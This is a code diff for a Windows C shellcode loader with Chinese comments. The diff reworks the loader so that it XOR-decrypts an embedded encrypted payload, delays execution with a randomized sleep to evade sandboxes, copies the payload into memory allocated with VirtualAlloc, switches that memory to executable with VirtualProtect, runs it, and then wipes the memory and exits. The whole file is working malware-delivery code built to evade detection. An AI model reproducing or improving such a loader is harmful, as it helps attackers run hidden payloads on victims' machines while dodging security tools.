@@ -1,27 +1,34 @@
 #include <windows.h>
+#include <stdlib.h>
+#include <string.h>
 #include "enc_shellcode.h"
 
-// 手动设置缓冲区为可执行（PE 页属性默认兼容 RX 段）
-unsigned char exec_buf[4096 * 10];  // 足够大，避免 VirtualAlloc
-
-// 解密 shellcode（XOR key = 0x5C）
-void xor_decrypt(unsigned char *dst, unsigned char *src, unsigned int len, unsigned char key) {
-    for (unsigned int i = 0; i < len; i++) {
-        dst[i] = src[i] ^ key;
-    }
+static void xor_dec(unsigned char *buf, unsigned int len, unsigned char key)
+{
+    for (unsigned int i = 0; i < len; ++i) buf[i] ^= key;
 }
 
-// 自定义入口，跳过 CRT
-void __stdcall mainCRTStartup(void) {
-    // 防沙箱延时
-    for (volatile int i = 0; i < 100000000; i++);
+void __stdcall mainCRTStartup(void)
+{
+    /* ❶ 反沙箱：2-5 s 随机 Sleep 代替忙等 */
+    Sleep((GetTickCount() & 0xFFF) % 3000 + 2000);
 
-    xor_decrypt(exec_buf, shellcode, shellcode_len, 0x5C);
+    /* ❷ DEP/NX：用 VirtualAlloc 拿 RW 内存，再转 RX 执行 */
+    LPVOID exec = VirtualAlloc(NULL, shellcode_len,
+                               MEM_COMMIT | MEM_RESERVE,
+                               PAGE_READWRITE);
+    if (!exec) ExitProcess(1);
 
-    // 函数指针类型转化后直接执行，无 CreateThread
-    void (*func)() = (void (*)())exec_buf;
-    func();
+    memcpy(exec, shellcode, shellcode_len);
+    xor_dec((unsigned char *)exec, shellcode_len, XOR_KEY);
 
-    // 永驻防止退出（可改为 Sleep 或 ExitProcess）
-    while (1) { Sleep(1000); }
+    DWORD old = 0;
+    VirtualProtect(exec, shellcode_len, PAGE_EXECUTE_READ, &old);
+
+    /* ❸ 就地执行；完成后立即自毁并退出 */
+    ((void(*)())exec)();
+
+    SecureZeroMemory(exec, shellcode_len);
+    VirtualFree(exec, 0, MEM_RELEASE);
+    ExitProcess(0);
 }
